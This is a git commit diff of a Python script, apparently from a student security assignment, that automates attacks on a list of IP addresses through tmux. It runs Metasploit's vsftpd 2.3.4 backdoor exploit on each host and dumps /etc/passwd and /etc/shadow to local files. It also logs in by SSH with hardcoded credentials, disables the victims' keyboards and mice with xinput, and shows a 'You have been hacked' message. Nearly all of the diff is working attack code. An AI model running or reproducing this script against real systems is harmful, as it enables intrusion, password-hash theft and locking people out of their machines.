70f3980d2d3996a7564df273078c95fe0fb66ac1
abcd911 <tapasjoshi.it@gmail.com>
2017-05-02 21:47:39 -0400

    Update 1

--- Assignment_5/code/stp.py
+++ Assignment_5/code/stp.py
@@ -6,11 +6,13 @@ import os
 import time
 from os import system
 import subprocess
-import _thread
+import threading
 
 user = "student"
 passwd = "\"student\""
+s_action = "enable"
 
+bufferedList = []
 
 def tmux(command):
     system('tmux %s' % command)
@@ -35,14 +37,15 @@ content = [x.strip() for x in content]
 # os.system("tmux new-window cd /etc/")
 
 def msf(task):
-
+    # If any tmux server running, kill it
+    os.system("tmux kill-server")
     for [index, ip] in enumerate(content):
-        # If any tmux server running, kill it
-        os.system("tmux kill-server")
+
+
         # Start a new tmux session
         os.system("tmux new -s " + str(index) + " -d &")
         # Attach the new tmux session with a new Terminator window
-        os.system("terminator -e 'bash -c \"tmux attach -t " + str(index) + "; exec bash\"'&")
+        os.system("gnome-terminal -e 'bash -c \"tmux attach -t " + str(index) + "; exec bash\"'&")
         # Run msf console
         tmux_shell('cd /opt/metasploit-framework/', str(index))
         tmux_shell('msfconsole', str(index))
@@ -70,56 +73,126 @@ def msf(task):
         # print(subprocess.run(['tmux', 'show-buffer'], stdout=subprocess.PIPE).stdout.decode('utf-8'))
 
 def savePass(type, t):
-    time.sleep(t)
+    time.sleep(0.5 + t)
+    os.system("gnome-terminal -e 'bash -c \"tmux new -s " + str(t) + "; exec bash\"'&")
+    # SSH to all the IP addresses
+    time.sleep(1.5)
+
+    tmux_shell('cd /opt/metasploit-framework/', str(t))
+    tmux_shell('msfconsole', str(t))
+
+    tmux_shell('use exploit/unix/ftp/vsftpd_234_backdoor', str(t))
+    tmux_shell('set RHOST ' + content.__getitem__(t), str(t))
+    tmux_shell('show options', str(t))
+    tmux_shell('exploit', str(t))
+
+    time.sleep(10)
+
     print("Wait Complete...Grabbing password files....")
-    for [index, ip] in enumerate(content):
-        # tmux_shell('tmux show-buffer -t '+index)
 
-        if type == "pass":
-            tmux_shell('cat /etc/passwd', str(index))
-            time.sleep(5)
+    if type == "pass":
+        tmux_shell('cat /etc/passwd', str(t))
+        time.sleep(5)
 
-        if type == "shadow":
-            tmux_shell('cat /etc/shadow', str(index))
-            time.sleep(5)
+        bufferedList.insert(t, subprocess.run(['tmux', 'show-buffer', '-b', str(t)], stdout=subprocess.PIPE).stdout.decode('utf-8'))
 
-        tmux('capture-pane -t '+str(index))
-        print(subprocess.run(['tmux', 'show-buffer'], stdout=subprocess.PIPE).stdout.decode('utf-8'))
-        tmux('save-buffer -b buffer0000 /home/profiler/NS/'+str(index)+"_"+type)
+        # print("Buffered List Output -> " + str(i) + "==========>" + str(bufferedList.__getitem__(i)))
+
+        if bufferedList.__getitem__(t).__contains__("Last login"):
+            print("Root shell aquired for " + content.__getitem__(t) + " ")
+
+        else:
+            print("Exploit failed for " + content.__getitem__(t) + " ")
+
+    if type == "shadow":
+        tmux_shell('cat /etc/shadow', str(t))
+        time.sleep(5)
+
+        bufferedList.insert(t, subprocess.run(['tmux', 'show-buffer', '-b', str(t)], stdout=subprocess.PIPE).stdout.decode('utf-8'))
+        tmux('save-buffer -b ' + str(t) + ' /home/profiler/NS/' + str(t) + "_" + type)
+
+        # print("Buffered List Output -> " + str(i) + "==========>" + str(bufferedList.__getitem__(i)))
+
+        if bufferedList.__getitem__(t).__contains__("Last login"):
+            print("Root shell aquired for " + content.__getitem__(t) + " ")
+
+        else:
+            print("Exploit failed for " + content.__getitem__(t) + " ")
+
+
+
+
+
+
+
 
 
 # Starts a loop to read ip addresses line by line and then opens ssh session to each IP
-def dis_key(action):
-    for [index, ip] in enumerate(content):
-        print(ip)
-        os.system("tmux kill-server")
-        # Start a new tmux session
-        #os.system("tmux")
-        os.system("tmux new -s " + str(index) + "&")
-        # Attach the new tmux session with a new Terminator window
-        os.system("terminator -e 'bash -c \"tmux attach -t " + str(index) + "; exec bash\"'&")
-        # SSH to all the IP addresses
-        tmux_shell('sshpass -p ' + passwd + ' ssh -o StrictHostKeyChecking=no ' + user + '@' + ip, str(index))
+def dis_key(action, i):
 
-        # ifconfig | grep 'inet addr' | cut -d: -f2 | awk '{print $1}'
+    tmux_shell('export DISPLAY=:0', str(i))
 
-        tmux_shell('export DISPLAY=:0', str(index))
+    for x in range(0, 10):
+        if action == "disable":
+            tmux_shell('sleep 1; xinput set-prop ' + str(x) + ' \'Device Enabled\' 0', str(i))
+            if x == 0:
+                tmux_shell('xmessage -center You have been hacked by Group 7 &', str(i))
+        elif action == "enable":
+            tmux_shell('sleep 1; xinput set-prop ' + str(x) + ' \'Device Enabled\' 1 &', str(i))
+            if x == 0:
+                tmux_shell('xmessage -center Everything back normal &', str(i))
 
-        for x in range(0, 20):
-            if action == "disable":
-                tmux_shell('sleep 0.1; xinput set-prop ' + str(x) + ' \'Device Enabled\' 0', str(index))
-                if x == 0:
-                   tmux_shell('xmessage -center You have been hacked by Group 7 &', str(index))
-            elif action == "enable":
-                tmux_shell('sleep 0.1; xinput set-prop ' + str(x) + ' \'Device Enabled\' 1 &', str(index))
-                if x == 0:
-                    tmux_shell('xmessage -center Everything back normal &', str(index))
-                    
+def dis_multithreaded(i):
+    time.sleep(0.5 + i)
+    os.system("gnome-terminal -e 'bash -c \"tmux new -s " + str(i) + "; exec bash\"'&")
+    # SSH to all the IP addresses
+    time.sleep(1.5)
+    tmux_shell('sshpass -p ' + passwd + ' ssh -o StrictHostKeyChecking=no ' + user + '@' + content.__getitem__(i), str(i))
+
+    time.sleep(100.5)
+    # ifconfig | grep 'inet addr' | cut -d: -f2 | awk '{print $1}'
+
+    tmux('capture-pane -t ' + str(i) + ' -b ' + str(i))
+
+    time.sleep(0.5)
+
+    bufferedList.insert(i, subprocess.run(['tmux', 'show-buffer', '-b', str(i)], stdout=subprocess.PIPE).stdout.decode('utf-8'))
+
+    #print("Buffered List Output -> " + str(i) + "==========>" + str(bufferedList.__getitem__(i)))
+
+    if bufferedList.__getitem__(i).__contains__("Last login"):
+        print("SSH to "+content.__getitem__(i)+" successful")
+        dis_key("disable", i)
+
+    else:
+        print("SSH to " + content.__getitem__(i) + " failed")
+
+
+def thread_m():
+    tmux("kill-server")
+    bufferedList.clear()
+    threads = []
+    for i in range(content.__len__()):
+        t = threading.Thread(target=dis_multithreaded, args=(i,))
+        threads.append(t)
+        t.start()
+
+def thread_pass():
+    tmux("kill-server")
+    #bufferedList.clear()
+    threads = []
+    for i in range(content.__len__()):
+        t = threading.Thread(target=savePass, args=("pass", i,))
+        threads.append(t)
+        t.start()
+
+thread_m()
+#thread_pass()
 
 # 192.168.16.128
-dis_key("disable")
+#dis_key("disable")
 #time.sleep(10)
-#dis_key("enable")
+#dis_key()
 
 #msf("get_shadow")
 #savePass("shadow", 2)
